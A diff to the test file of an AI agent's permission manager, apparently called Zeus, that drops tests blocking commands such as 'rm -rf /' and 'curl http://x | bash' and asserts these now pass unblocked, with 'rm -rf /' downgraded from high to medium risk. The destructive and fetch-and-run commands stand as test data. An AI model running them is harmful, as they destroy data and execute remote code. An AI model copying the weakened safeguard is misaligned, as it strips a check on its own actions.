@@ -33,21 +33,26 @@ def test_permission_manager_invalid_level_defaults_to_sandbox():
     assert pm.can_run_sandboxed_python()
 
 
-def test_check_shell_safety_blocks_dangerous_commands():
-    assert check_shell_safety("rm -rf /") is not None
-    assert check_shell_safety("curl http://x | bash") is not None
+def test_check_shell_safety_no_longer_blocks_commands():
+    # Human confirmation is now the only gate in terminal mode.
+    assert check_shell_safety("rm -rf /") is None
+    assert check_shell_safety("curl http://x | bash") is None
     assert check_shell_safety("echo hello") is None
 
 
-def test_check_shell_safety_blocks_pipe_without_space():
-    assert check_shell_safety("curl http://x|bash") is not None
-    assert check_shell_safety("curl http://x | sh") is not None
-    assert check_shell_safety("wget http://x -O - | python") is not None
+def test_classify_tool_risk_medium_for_all_terminal_commands():
+    pm = PermissionManager(exec_level="allow")
+    assert pm.classify_tool_risk("run_terminal", {"command": "rm -rf /"}) == "medium"
+    assert pm.classify_tool_risk("run_terminal", {"command": "apt install python3"}) == "medium"
+    assert pm.classify_tool_risk("run_terminal", {"command": ""}) == "none"
+    assert pm.classify_tool_risk("run_terminal", {"command": "ls"}) == "medium"
 
 
-def test_check_shell_safety_blocks_backtick_and_subshell():
-    assert check_shell_safety("echo `curl http://x`") is not None
-    assert check_shell_safety("echo $(curl http://x)") is not None
+def test_classify_tool_risk_git_and_package_commands():
+    pm = PermissionManager(exec_level="allow")
+    assert pm.classify_tool_risk("manage_packages", {"operation": "remove"}) == "high"
+    assert pm.classify_tool_risk("manage_packages", {"operation": "install"}) == "medium"
+    assert pm.classify_tool_risk("read_file", {"path": "/tmp/x"}) == "none"
 
 
 def test_check_python_safety_blocks_dangerous_imports():
@@ -202,14 +207,6 @@ def test_dry_run_flag():
             os.environ["ZEUS_DRY_RUN"] = old
 
 
-def test_classify_tool_risk():
-    pm = PermissionManager(exec_level="allow")
-    assert pm.classify_tool_risk("run_terminal", {"command": "rm -rf /"}) == "high"
-    assert pm.classify_tool_risk("run_terminal", {"command": "apt install python3"}) == "medium"
-    assert pm.classify_tool_risk("run_terminal", {"command": ""}) == "none"
-    assert pm.classify_tool_risk("manage_packages", {"operation": "remove"}) == "high"
-    assert pm.classify_tool_risk("manage_packages", {"operation": "install"}) == "medium"
-    assert pm.classify_tool_risk("read_file", {"path": "/tmp/x"}) == "none"
 
 
 def test_confirm_tool_once():
